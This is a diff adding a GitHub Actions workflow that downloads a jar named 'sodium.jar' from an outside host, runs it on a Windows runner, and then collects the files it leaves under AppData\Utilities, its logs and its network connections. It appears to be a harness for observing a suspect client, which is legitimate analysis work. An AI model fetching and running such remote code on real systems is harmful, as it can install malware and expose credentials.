@@ -1,0 +1,33 @@
+name: LX-CLIENT
+on:
+  workflow_dispatch:
+
+jobs:
+  c:
+    runs-on: windows-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+      - name: Run client directly and capture
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\c"; New-Item -ItemType Directory -Force $d | Out-Null
+          Invoke-WebRequest "https://files.driftmetrics.xyz/sodium.jar" -OutFile "$d\c.jar"
+          Start-Process java -ArgumentList "-Dcompat.legacy=true","-Duserid=1","-jar","$d\c.jar" -RedirectStandardOutput "$d\out.log" -RedirectStandardError "$d\err.log" | Out-Null
+          Start-Sleep 60
+          Get-ChildItem "$env:APPDATA\Utilities" -Recurse -ErrorAction SilentlyContinue | Select FullName,Length | Out-File "$d\utils.txt"
+          Copy-Item "$env:APPDATA\Utilities\*\logs\*" "$d\" -Recurse -ErrorAction SilentlyContinue
+          Get-ChildItem "$env:APPDATA\Utilities" -Recurse -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName)"; Get-Content $_.FullName -Tail 40 }
+          netstat -ano | Select-String "ESTABLISHED" | Select-Object -First 15
+      - name: Kill
+        if: always()
+        shell: powershell
+        run: Get-CimInstance Win32_Process -Filter "name='java.exe' or name='javaw.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: lx-client
+          path: ${{ runner.temp }}/c
